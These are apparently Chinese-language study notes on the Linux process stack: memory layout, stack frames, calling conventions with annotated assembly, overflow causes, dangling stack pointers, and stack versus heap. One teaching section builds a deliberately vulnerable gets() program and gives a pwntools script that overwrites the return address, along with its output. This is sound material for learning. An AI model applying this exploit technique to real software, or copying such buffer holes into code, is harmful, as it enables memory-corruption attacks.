```table-of-contents
```
# 背景知识

## 用户态虚拟内存空间的布局

如下所示：**进程用户态**虚拟内存空间分别在 32 位机器和 64 位机器上的布局情况。

（1）32位机器
![](attachments/Pasted%20image%2020250703123826.png)




（2）64位机器
![](attachments/Pasted%20image%2020250703123917.png)

## 内核态虚拟内存空间的布局

（1）32位系统中虚拟内存空间整体布局

![](attachments/Pasted%20image%2020250703124057.png)


（2）64位系统中虚拟内存空间整体布局
![](attachments/Pasted%20image%2020250703124125.png)


# 为什么需要栈
我们知道一个函数调用有以下三个基本过程：  
- 调用参数的传入  
- 局部变量的空间管理  
- 函数返回


函数的调用必须是高效的，而数据存放在 **CPU通用寄存器** 或者 **RAM 内存** 中无疑是最好的选择。以传递调用参数为例，我们可以选择使用 CPU通用寄存器 来存放参数。但是通用寄存器的数目都是有限的，当出现函数嵌套调用时，子函数再次使用原有的通用寄存器必然会导致冲突。因此如果想用它来传递参数，那在调用子函数前，就必须先 **保存原有寄存器的值**，然后当子函数退出的时候再 **恢复原有寄存器的值** 。

函数的调用参数数目一般都相对少，因此通用寄存器是可以满足一定需求的。但是局部变量的数目和占用空间都是比较大的，再依赖有限的通用寄存器未免强人所难，因此我们可以采用某些 RAM 内存区域来存储局部变量。但是存储在哪里合适？既不能让函数嵌套调用的时候有冲突，又要注重效率。


这种情况下，栈无疑提供很好的解决办法。
一、对于通用寄存器传参的冲突，我们可以再调用子函数前，将通用寄存器临时压入栈中；在子函数调用完毕后，在将已保存的寄存器再弹出恢复回来。
二、而局部变量的空间申请，也只需要向下移动下栈顶指针；将栈顶指针向回移动，即可就可完成局部变量的空间释放；
三、对于函数的返回，也只需要在调用子函数前，将返回地址压入栈中，待子函数调用结束后，将函数返回地址弹出给 PC 指针，即完成了函数调用的返回；

于是上述函数调用的三个基本过程，就演变记录一个栈指针的过程。每次函数调用的时候，都配套一个栈指针。即使循环嵌套调用函数，只要对应函数栈指针是不同的，也不会出现冲突。
![](attachments/Pasted%20image%2020250703144721.png)


# 栈的概念
栈可以理解为一个特殊的容器，用户可以将数据依次放入栈中，然后再将数据按照相反的顺序从栈中取出。也就是说，先放入的数据最后才能取出，而最后放入的数据必须先取出。这称为先进后出（First In Last Out）原则。

放入数据常称为入栈或压栈（Push），取出数据常称为出栈或弹出（Pop）。如下图所示：

可以发现，栈底始终不动，出栈入栈只是在移动栈顶，当栈中没有数据时，栈顶和栈底重合。  

从本质上来讲，==栈是一段连续的内存，需要同时记录栈底和栈顶，才能对当前的栈进行定位==。


## 用户态进程虚拟空间的栈
![](attachments/Pasted%20image%2020250703124337.png)

```bash
Linux 对进程地址空间有个标准布局，地址空间中由各个不同的内存段组成 (Memory Segment)，主要的内存段如下：
	程序段 (Text Segment)：可执行文件代码的内存映射
	数据段 (Data Segment)：可执行文件的已初始化全局变量的内存映射
	BSS段 (BSS Segment)：未初始化的全局变量或者静态变量（用零页初始化）
	堆区 (Heap) : 存储动态内存分配，匿名的内存映射
	栈区 (Stack) : 进程用户空间栈，由编译器自动分配释放，存放函数的参数值、局部变量的值等
	映射段(Memory Mapping Segment)：任何内存映射文件
```


在现代计算机中，通常使用`ebp「Extend Base Pointer」`寄存器指向栈底，而使用`esp「Extend Stack Pointer」`寄存器指向栈顶。随着数据的进栈出栈，`esp` 的值会不断变化，进栈时 `esp` 的值减小，出栈时 `esp` 的值增大。  
`ebp` 和 `esp` 都是`CPU中`的寄存器。

如下图所示是一个栈的实例：
![](attachments/Pasted%20image%2020250103105450.png)

# 栈的特点
## 特点
### 函数级别
每个函数调用都会在栈上创建一个新的栈帧（stack frame），它包含了该函数的局部变量、参数和返回地址等信息。

### 后进先出 (LIFO)
 栈的操作遵循后进先出原则，最后被压入栈的内容最先被弹出。

### 栈的访问

 栈的访问速度非常迅速，这主要归功于其背后的硬件支持，比如寄存器，它们承担着管理栈指针的任务。  

### 栈内存的分配和释放
系统会自动为栈进行空间的分配与回收，当线程执行结束后，这些空间便会自动释放。
当进行函数调用时，进栈和出栈，将相关信息压入到栈中。


![](attachments/Pasted%20image%2020250703142209.png)

栈内存由程序自动维护，**栈段内存紧密排列，不会出现内存碎片的问题**；
**栈的内存的申请释放，其实就是移动栈指针，不需要手动申请和释放，不必担心内存泄漏问题**。

#### 分配以及释放的理解

函数调用时的压栈，以及调用函数结束之后，这个函数的帧空间被释放（其实就是移动了栈指针esp的位置)；
本质上讲，其实空间还在，依然可以被访问。

#### 空间复用
下一函数调用会立即覆盖已释放的栈空间

## 栈帧(stack frame)

栈(stack)是针对线程来说的；
帧(frame)是针对函数来说的；
所以 gdb 调试的时候， `info threads`可以看到多个线程，每个现场都有堆栈，通过`bt`查看堆栈；如果要进入到某个函数/帧，就通过`f n`直接进入到某个帧(frame)。

每个函数都有属于自己的一个函数栈帧，假设函数调用关系为：main->func1->func2，那么在执行到func2的时候，该进程的堆栈空间如下所示：
![](attachments/Pasted%20image%2020250707163850.png)

栈帧一般包含如下信息：
- 函数的实参和局部变量
- 函数调用链接信息：调用函数时要保存某些CPU寄存器的值，如PC，以便返回时能继续执行下一条指令

### 栈中保存的信息
栈保存了函数调用需要维护的信息，这称为堆栈帧或活动记录。

![](attachments/Pasted%20image%2020250703151055.png)

图中就是一个堆栈帧的实例图，即函数调用时会产生的一个在栈中保存的信息，其中使用ebp及esp两个寄存器来划定函数的活动记录。
esp始终指向栈顶部，即当前的函数的活动记录的顶部，而ebp则固定不动，其指向的是调用函数前ebp的数据，于是在调用完成后，ebp会重新获得调用前的值。

#### 进栈
至于一个堆栈帧的结构是这样的原因就是因为调用函数时所需要进行的一系列操作导致的：
```bash
（1）将所有参数或一部分参数入栈  
（2）将当前指令的下一条指令地址入栈（返回地址）  
（3）跳转到函数体执行，在函数体开始执行时还需要完成一部分操作：ebp入栈，将ebp指向esp(栈顶)，分配所需字节的临时空间，保存寄存器.
```
其中第2和3步在汇编代码中就是由call指令完成的。

#### 出栈
实际的调用函数完成后的返回过程与之前相反：
```bash
(1) 将寄存器出栈，还原需要保存的寄存器值  
(2) 将ebp的地址赋给esp，即回收临时空间  
(3) ebp出栈，还原ebp值  
(4) ret 执行原来保存的当前指令的下条指令
```

对应于具体的汇编代码就是这样：
```bash
(1) pop 寄存器名    
/*对应于上面的最后一步操作，有n个寄存器就需要出栈n次*/

(2) mov esp,ebp    
/*将esp指向ebp指向的位置，简单来说就是将栈顶设置在了old ebp的具体存储位置上，那么堆与局部变量的部分就属于了栈外，相当于回收了局部变量占用的空间*/

(3) pop ebp    
/*将ebp的值恢复*/

(4) ret    
/*位于ebp上面的部分就是返回地址，从而ret命令获取返回地址，并跳转到该位置上，于是完成了一个函数的调用结束返回的工作*/
```

### 函数调用
要实现函数调用，必须解决以下几个问题：
- 参数的传递
- 返回值的传递
- stack 的维护(局部变量的空间管理等)

我们通常使用栈帧(stack frame)实现函数的调用，它的结构如下：
```bash
 high address
                                 +---------------+
                                 |               |
                                 |      Old      |
                                 |     Stack     |
                                 |     Frame     |
                                 |               |
                --------------   +---------------+
                      ^     ^    |   Parameters  |
                      |   caller +---------------+
                      |     v    |  Return addr  |
                           ---   +---------------+
                Stack Frame ^    |    Old  ebp   |   <------- ebp  Frame Pointer
                            |    +---------------+
                      |  callee  |   Registers   |
                      |     |    +---------------+
                      v     v    |   Local vars  |
                --------------   +---------------+   <------- esp  Stack Pointer

low address  
```

首先介绍 x86 下的两个寄存器：
- esp：栈寄存器，永远指向程序的栈顶。
- ebp：帧寄存器，指向当前的帧


我们把主动调用函数的一方称为 caller，被调用的一方称为 callee，当函数被调用时，caller 首先把参数压栈，然后压栈返回地址，之后跳到相应的函数执行。当跳到相应的函数时，callee 需保存 caller 的帧地址，即把上个函数的帧地址压入栈中，并更新当前的帧寄存器，之后保存某些寄存器的值，最后才是为 callee 函数体内的局部变量开辟空间。当函数调用结束后，当前栈帧所占用的空间已经没有用处，所以需要释放这片空间，即把当前栈帧的所有数据全部弹出。

函数的调用规则有多种，这些规则主要表现在某些细节的差异，比如参数的压栈顺序，参数的出栈。[Cdecl](http://linux.die.net/man/1/cdecl) 是 C 语言默认的规则，它规定参数从右到左压栈，调用方负责参数的出栈。

#### 调用规则
（1）参数传递方式：
从右至左的顺序压参数入栈（对于一个foo(int m,int n )这样一个函数来说，参数入栈时的顺序就是先n后m）  

（2）出栈方：
由函数调用方将参数等出栈

（3）名字修饰：
直接在函数名称前加1个下划线”_”

#### 范例
```c
#include <stdio.h>

int foo(int a, int b)
{
    char x =1;
    int c = 0;
    c = a + b + x;
    return c;
}

int main()
{
    int ret = 0;
    ret = foo(2, 3);
    return 0;
}
```


编译所得的汇编如下：
```bash
foo:
.LFB0:
    .file 1 "call_no_stack.c"
    .loc 1 4 0
    .cfi_startproc
    pushq    %rbp             //rbp入栈 （rsp-8）
    .cfi_def_cfa_offset 16
    .cfi_offset 6, -16
    movq    %rsp, %rbp       //rsp 赋值给 rbp，这里rsp并没有移动，可能是因为这里是最后一个函数调用，所以不需要移动rsp
    .cfi_def_cfa_register 6
    movl    %edi, -20(%rbp)  //这里通过rbp来访问栈，将main函数中的实参2放入rbp-20内存
    movl    %esi, -24(%rbp)  //这里表示栈空间分配了24字节，猜测：函数中的参数值从栈顶开始存储
    .loc 1 5 0
    movb    $1, -5(%rbp)     //局部变量x入栈，x占用1个字节，相当于x后入栈：栈的地址是向下减少的
    .loc 1 6 0
    movl    $0, -4(%rbp)     //局部变量c入栈，放在rbp-4处
    .loc 1 7 0
    movl    -20(%rbp), %edx   
    movl    -24(%rbp), %eax
    addl    %eax, %edx      //相加操作
    movsbl    -5(%rbp), %eax 
    addl    %edx, %eax
    movl    %eax, -4(%rbp)
    .loc 1 8 0
    movl    -4(%rbp), %eax  //将c变量的结果保存到eax寄存器，以便函数返回
    .loc 1 9 0
    popq    %rbp            //将堆栈pop，此时栈顶保存着调用函数的rbp值，将栈顶元素赋予rbp寄存器（恢复rbp寄存器）
    .cfi_def_cfa 7, 8
    ret                     //跳转回上一层处继续执行
    .cfi_endproc
.LFE0:
    .size    foo, .-foo
    .globl    main
    .type    main, @function
main:
.LFB1:
    .loc 1 12 0
    .cfi_startproc
    pushq    %rbp              //rbp：64位寄存器——指向栈底，将rbp寄存器内的值入栈-pushq操作会改变rsp的值
    .cfi_def_cfa_offset 16
    .cfi_offset 6, -16
    movq    %rsp, %rbp         //rsp：64位堆栈指针寄存器——指向栈顶，将rsp值存入rbp寄存器内
    .cfi_def_cfa_register 6
    subq    $16, %rsp          //rsp-16，这里讲栈顶指针向下移动16字节，相当于为main函数预留了16字节的栈空间-保存局部变量包括实参
    .loc 1 13 0
    movl    $0, -4(%rbp)       //对应局部变量ret = 0
    .loc 1 14 0
    movl    $3, %esi           //这里直接将实参存入esi寄存器而不是放入堆栈，可加快访问速度
    movl    $2, %edi
    call    foo                //调用foo函数:call指令有另个作用：1，将call指令的下一条指令入栈-并改变rsp 2，修改程序计数器eip，跳转到foo函数的开头执行
    movl    %eax, -4(%rbp)     //eax寄存器保存着返回值，这里将eax赋值给rbp-4的位置，也就是ret
    .loc 1 15 0
    movl    $0, %eax
    .loc 1 16 0
    leave                     //leave指令是函数开头的pushq %rbp和movq %rsp,%rbp的逆操作,　　　　　　　　　　　　　　　　　　//有两个作用：1，把rbp赋值给rsp 2,然后把该函数栈栈顶保存的rbp值恢复到rbp寄存器中,同时rsp+4(第二部的操作相当于pop栈顶元素)
    .cfi_def_cfa 7, 8
    ret                       //现在栈顶元素保存的是下一条执行的指令，ret的作用就是pop栈顶元素，并将栈顶元素赋值给程序计数器bip，然后程序跳转回bip所在地址继续执行
    .cfi_endproc
.LFE1:
    .size    main, .-main
```

上述汇编代码可以用下图较为直观的展示：

![](attachments/Pasted%20image%2020250707164152.png)

### 栈中保存的信息


## 栈和函数以及线程的关系

每个任务（线程）都有自己的栈空间，正是有了独立的栈空间，为了代码重用，不同的任务甚至可以混用任务的函数体本身，例如可以一个main函数有两个任务实例（线程）。
即：每个线程独享一块内存区域，我们称之为栈，它的运作模式是后进先出，以此来存储信息。当函数被调用时，栈会承担起存储局部变量、函数参数和返回地址等任务。每当一个线程启动，系统就会自动给它分配一个预先设定的栈空间。  
以一个简单的多线程程序为例，当每个线程执行函数时，它产生的信息会被存储在各自的栈中。这些栈在空间上的扩展方向是从高地址向低地址，这一特点使得它们在空间使用上更加灵活。  



**（1）帧(frame)是函数级别的**
进栈、出栈是针对函数来说的，主要用于存储函数的局部变量、参数以及返回地址等信息。
每当一个函数被调用时，系统会为该函数分配一块栈空间，函数执行完毕后，这块空间会被释放。

**（2）栈(stack)是线程级别**
一个程序可以包含多个线程，每个线程都有自己的栈。
**==严格来说，栈的最大值是针对线程来说的==**，而不是针对程序。




# 栈的大小以及溢出
对每个程序来说，栈能使用的内存是有限的，一般是 `1M~8M`，这在编译时就已经决定了，程序运行期间不能再改变。
如果程序使用的栈内存超出最大值，就会发生栈溢出（Stack Overflow）错误。  

## 栈的大小
```bash
# ulimit -a
core file size          (blocks, -c) unlimited
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 1290490
max locked memory       (kbytes, -l) unlimited
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024000
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 10240
cpu time               (seconds, -t) unlimited
max user processes              (-u) 655350
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited


```
如上所示，栈的大小为10M。


## 栈的溢出
### 栈溢出的可能原因
#### 递归调用过深
当一个函数递归调用自身时，如果递归层数过多，可能会耗尽栈空间。

```c
void recursive_function() {
    // 每次调用都会在栈上分配新的栈帧
    recursive_function();
}

int main() {
    recursive_function(); // 可能导致栈溢出
    return 0;
}

```

#### 局部变量过大
如果在函数中定义了非常大的局部数组或结构体，可能会导致栈空间不足。
例如：
```c
void function() {
    int large_array[100000]; // 大数组可能导致栈溢出
}

```

#### 嵌套函数调用
 如果函数之间的调用层次过深，栈帧的累积也可能导致栈溢出。

### 栈溢出的影响
（1）导致与其相邻的栈中的变量的值被改变。

（2）栈溢出攻击：修改函数的返回地址，使其指向攻击代码。

当函数调用结束时程序跳转到攻击者设定的地址，修改函数指针，长跳转缓冲区来找到可溢出的缓冲区


### 解决栈溢出的方法
#### 增加栈大小
在某些系统中，可以通过修改系统的设置来增加每个线程的栈大小。例如，使用 `ulimit -s` 命令可以查看和设置栈的大小限制。

#### 使用动态内存分配
对于需要较大内存的变量，考虑使用 `malloc` 或 `calloc` 在堆上分配内存，而不是在栈上。
    
####  优化递归
如果使用递归，考虑将其改写为迭代形式，或使用尾递归优化（如果编译器支持）。
#### 避免过深的函数嵌套

尽量减少函数调用的层次，保持代码的简洁和可读性。

### 范例
**正常的程序范例**：
```c
# cat test_stack.c
#include <stdio.h>
int main(){

    printf("stack test start.\n");
    char str[1024*1024*2] = {0};
    printf("stack test end.\n");
    return 0;
}

编译以及测试：
# gcc -g -O0 test_stack.c -o test_stack2
# ./test_stack2
stack test start.
stack test end.
```


**栈溢出的程序范例**：
```c
# cat test_stack.c
#include <stdio.h>
int main(){

    printf("stack test start.\n");
    char str[1024*1024*20] = {0};
    printf("stack test end.\n");
    return 0;
}

编译以及测试：
# gcc -g -O0 test_stack.c -o test_stack
# ./test_stack
Segmentation fault (core dumped)
```

# 栈的内存覆盖

## 问题：函数外访问函数内局部变量的空间

调用函数结束之后，这个函数的帧空间被释放（其实就是移动了栈指针esp的位置），本质上讲，其实空间还在，依然可以被访问。


### 范例
(1) 原始范例：
```c
# cat a1.c
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    int *ptr;
} MyStruct;

void setStruct(MyStruct *s) {
    int local = 42; // 局部变量
    s->ptr = &local; // 将结构体成员指向局部变量
} // 函数返回后，local的地址不再有效

int main() {
    MyStruct s;
    setStruct(&s);
    // 这里访问的是悬空指针
    printf("%d\n", *(s.ptr)); // 未定义行为：可能打印42，也可能打印垃圾值或导致崩溃
    return 0;
}
```

```bash
# gcc a1.c -o a1
# ./a1
42
```


（2）在调用和访问之间加入另一个函数调用，以覆盖栈帧：

```c
# cat a2.c
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    int *ptr;
} MyStruct;

void setStruct(MyStruct *s) {
    int local = 42;
    s->ptr = &local;
}

void someFunction() {
    int a = 100;
    int b = 200;
    // 这个函数使用一些局部变量，可能会覆盖之前的栈空间
}

int main() {
    MyStruct s;
    setStruct(&s);
    someFunction(); // 覆盖了setStruct中局部变量所占用的栈空间
    printf("%d\n", *(s.ptr)); // 很可能不会打印42，而是打印100、200或任意值，也可能崩溃
    return 0;
}
```

```bash
# gcc a2.c -o a2
# ./a2
100
```


#### 更隐蔽的安全漏洞示例

```c
#include <stdio.h>
#include <string.h>

typedef struct {
    char *buffer_ptr;
} Config;

void load_config(Config *cfg) {
    char local_buffer[32];
    strcpy(local_buffer, "Sensitive Data");
    cfg->buffer_ptr = local_buffer;  // 灾难性错误
}

void login() {
    char auth_token[64];
    printf("Enter auth token: ");
    fgets(auth_token, sizeof(auth_token), stdin);
    // 认证逻辑...
}

int main() {
    Config config;
    load_config(&config);
    
    login();  // 用户输入可能覆盖敏感数据
    
    // 此时"敏感数据"可能已被用户输入覆盖
    printf("Config: %s\n", config.buffer_ptr); 
    
    return 0;
}
```

灾难性后果：
(1) 敏感数据泄露（栈上的 local_buffer 被覆盖后可能包含用户输入）
(2) 认证绕过（用户可能通过精心构造输入篡改配置）
(3) 注入攻击（覆盖后的内存可能包含可执行代码）

### 分析

在C语言中，函数内部的局部变量存储在栈上，函数返回后，这些局部变量的内存空间会被释放（栈指针移动，该内存区域可以被后续函数调用覆盖）。如果函数外部通过指针访问这些已经释放的局部变量，将导致未定义行为`（Undefined Behavior）`。

**尽管在某些情况下程序可能看起来正常运行（例如，尚未被覆盖）**，但这是非常危险的；
比如，后续修改代码，函数调用结束之后，又调用了另外一个函数，然后才是通过指针访问栈上之前函数内部局部变量的空间。
但是，可能**后续该栈上的空间被覆盖重写了，就会导致错误**。

#### 风险分析：

**（1）数据被覆盖**：
后续的函数调用可能会使用该栈地址，从而修改其中的内容。

**（2）不可预测的行为**：
（2.1）编译器优化不可预测
程序可能在某些时候正常工作，但在其他时候崩溃或产生错误结果，这取决于编译器优化和运行时环境「比如：在不同的编译环境中编译出的二进制，出现了不同的结果」。

（2.2）修改代码是否覆盖该栈空间，不可预测
稍微修改一些代码，就产生了无法和修改不相干的无法解释的错误「其实是栈内存的覆盖」。


### 解决
（1）函数内部使用分配堆上的空间，而不是局部变量空间。

（2）值拷贝代替指针

### 小结
永远不要返回指向栈内存的指针！局部变量的生命周期仅限于其作用域，超出后任何访问都是未定义行为。

# 栈溢出攻击
最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，**当然需要确保这个地址所在的段具有可执行权限**。

```c
#include <stdio.h>
#include <string.h>

void success(void)
{
    puts("You Hava already controlled it.");
}

void vulnerable(void)
{
    char s[12];

    gets(s);
    puts(s);

    return;
}

int main(int argc, char **argv)
{
    vulnerable();
    return 0;
}
```
这个程序的主要目的读取一个字符串，并将其输出。**我们希望可以控制程序执行 success 函数。**

利用如下命令对其进行编译:
```bash
# gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
stack_example.c: In function ‘vulnerable’:
stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.


注：
m32` 指的是生成 32 位程序； 
`-fno-stack-protector` 指的是不开启堆栈溢出保护，即不生成 canary。
```
## gets的危险性
可以看出 `gets` 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，

## CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护

栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让攻击代码能够得到执行。
当启用栈保护后，函数开始执行的时候会先往栈里插入`cookie`信息，当函数真正返回的时候会验证`cookie`信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将`cookie`信息给覆盖掉，导致栈保护检查失败而阻止攻击代码的执行。在Linux中我们将`cookie`信息称为`canary`。

因此在编译时可以控制是否开启栈保护以及程度，例如：
```bash
gcc -o test test.c                       #默认情况下，不开启Canary保护
gcc -fno-stack-protector -o test test.c  #禁用栈保护
gcc -fstack-protector -o test test.c     #启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
gcc -fstack-protector-all -o test test.c #启用堆栈保护，为所有函数插入保护代码

```

## PIE
此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。

不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令`gcc -v`查看 gcc 默认的开关情况。如果含有`--enable-default-pie`参数则代表 PIE 默认已开启，需要在编译指令中添加参数`-no-pie`。

## checksec 工具
编译成功后，可以使用 checksec 工具检查编译出的文件：
```bash
# checksec stack_example
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## 地址空间分布随机化(ASLR)
提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 `/proc/sys/kernel/randomize_va_space` 来控制 ASLR 启动与否，具体的选项有

- 0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。
- 1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。
- 2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。

## 反编译二进制程序
确认 ASLR 和 PIE 保护 关闭， 并设置了  `-fno-stack-protector`后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到：
```c
int vulnerable()
{
  char s; // [sp+4h] [bp-14h]@1

  gets(&s);
  return puts(&s);
}
```

字符串`s`距离 `ebp` 的长度为 `0x14`，那么相应的栈结构为
```bash
           +-----------------+
           |     retaddr     |
           +-----------------+
           |     saved ebp   |
    ebp--->+-----------------+
           |                 |
           |                 |
           |                 |
           |                 |
           |                 |
           |                 |
s,ebp-0x14-->+-----------------+
```

并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。
```bash
.text:0804843B success         proc near
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 8
.text:08048441                 sub     esp, 0Ch
.text:08048444                 push    offset s        ; "You Hava already controlled it."
.text:08048449                 call    _puts
.text:0804844E                 add     esp, 10h
.text:08048451                 nop
.text:08048452                 leave
.text:08048453                 retn
.text:08048453 success         endp
```

## 构造攻击

如果我们读取的字符串为
```bash
0x14*'a'+'bbbb'+success_addr
```

由于 `gets` 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 `saved ebp` 覆盖为 `bbbb`，将 `retaddr` 覆盖为 `success_addr`，即，此时的栈结构为：

```bash
           +-----------------+
           |    0x0804843B   |
           +-----------------+
           |       bbbb      |
    ebp--->+-----------------+
           |                 |
           |                 |
           |                 |
           |                 |
           |                 |
           |                 |
s,ebp-0x14-->+-----------------+
```

需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 `0x0804843B` 在内存中的形式是:
```bash
\x3b\x84\x04\x08
```

但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：

```python
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x08049186
## 构造payload
payload = b'a' * 0x14 + b'bbbb' + p32(success_addr)
print(p32(success_addr))
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
```

执行如下：可以看到我们确实已经执行 `success` 函数。
```bash
# python exp.py
[+] Starting local process './stack_example': pid 61936
;\x84\x0
[*] Switching to interactive mode
aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
You Hava already controlled it.
[*] Got EOF while reading in interactive
$ 
[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
[*] Got EOF while sending in interactive
```



# 堆栈和栈以及堆

栈和堆在不同的场景下所代表的含义不同，一般情况有两层含义：
- 程序内存布局场景下：栈与堆表示两种内存管理方式。
- 数据结构场景下：栈与堆表示两种常用的数据结构。

![](attachments/Pasted%20image%2020250103105620.png)

![](attachments/Pasted%20image%2020250703145831.png)


## 区别
栈和堆是两种基本的内存的管理模式，在设计目的、内存分配、应用场景有明显的区别。理解这些区别对于`优化程序性能`和`避免内存泄漏`至关重要。

### 分配方式
- 栈：有静态分配和动态分配两种分配方式。静态分配由操作系统自动分配和释放，比如局部变量的分配。动态分配由 alloca 函数进行分配。这两种分配方式都无需开发人员手动控制。
- 堆：只有动态分配，由开发人员控制分配和释放工作，容易产生内存泄漏。

### 存放内容
- 栈：存放函数返回地址、相关参数、局部变量和寄存器内容等。
- 堆：存放动态分配的数据，如大型对象。

### 内存大小
- 栈：大小有限，通常由操作系统限制。--- 每个进程拥有的【栈的大小 要远远小于 堆的大小】。进程栈的大小 64bit 的 window 默认 1MB，64bits 的 Linux 默认 10MB。
- 堆：大小灵活，理论上只受限于系统内存。

### 缓存方式

- 栈：使用的是一级缓存， 通常都是被调用时处于存储空间中，调用完毕立即释放。
- 堆：是存放在二级缓存中，调用这些对象的速度要相对来得低一些。

### 分配效率（性能）

- 栈：访问速度快，一是操作系统自动内存分配和释放，会在硬件层级对栈提供支持；二是分配专门的寄存器存放栈的地址，压栈出栈都有专门的指令执行，这就决定了栈的效率比较高。
- 堆：访问速度较慢，需手动管理内存。由库函数或运算符来完成申请与管理，实现机制较为复杂，频繁的内存申请容易产生内存碎片。

### 生长方向

- 栈：栈的生长方向向下，内存地址由高到低。
- 堆：堆的生长方向向上，内存地址由低到高。

### 应用场景

- 栈：存放生命周期短、大小固定的数据，如函数调用栈。
- 堆：存放生命周期长、大小不固定的数据，如动态数组、链表等。
> 需要注意的是：后申请的内存空间并不一定在先申请的内存空间的后面，原因是先申请的内存空间一旦被释放，后申请的内存空间会利用先前释放的内存，从而导致先后分配的内存空间在地址上不存在先后关系。

### 常见问题

无论是堆还是栈，在内容使用的时候都要防止非法越界，越界导致的非法内存访问可能会摧毁程序的堆，栈数据，轻则导致程序运行处于不确定状态，获取不到预期结果，重则导致程序异常崩溃，这些都是我们编程时与内存打交道时应该注意的问题。
- **栈溢出**：当栈空间不足时，会导致程序崩溃。
- **内存泄漏**：堆内存未及时释放，导致内存浪费。
> - 堆中存储的数据若未被释放，其生命周期等同于程序的生命周期。
- **性能优化**：合理使用栈和堆，可以提升程序性能。

## 适用场景
### 使用栈的情况：

（1）局部变量和函数参数：如果变量的作用域仅限于函数内部，并且不需要在函数之间共享数据，可以使用栈。栈上的局部变量和函数参数在函数调用结束时会自动销毁，无需手动释放内存。
（2）小内存需求：如果需要分配较小的内存块，并且栈的大小足以满足需求，可以使用栈。栈内存的分配和释放速度较快，不需要动态内存管理的开销。
（3）对象的生存周期与作用域一致：如果变量的生存周期与其所在的作用域一致，并且不需要在作用域之外继续使用变量，可以使用栈。

### 使用堆的情况：

（1）动态内存分配：如果需要在运行时动态地分配内存，并且在程序的不同部分之间共享数据，可以使用堆。例如，当需要在程序的不同函数之间传递数据时，可以在堆上分配内存，并将指针传递给函数。
（2）大内存需求：如果需要分配大块内存，而栈的大小有限制，无法满足需求，可以使用堆。堆内存的大小没有固定限制，可以根据需要动态分配大块内存。
（3）对象的生存周期：如果需要在变量的生存周期超出其作用域的情况下继续使用变量，可以使用堆。堆上分配的对象可以在堆上存活很长时间，直到手动释放。


# 参考
```bash

# 浅谈Linux 中的进程栈、线程栈、内核栈、中断栈
https://zhuanlan.zhihu.com/p/188577062

# 内存管理之堆和栈
https://mp.weixin.qq.com/s/YnGgBKzOgJ8cTRcL6ScEgA

# （C语言内存十二）栈（Stack）是什么？栈溢出又是怎么回事？
https://www.cnblogs.com/still-smile/p/14900502.html

# Linux栈溢出总结（0x01）
https://www.ascotbe.com/2020/11/19/StackOverflow_Linux_0x01/

# 栈溢出原理
https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/


```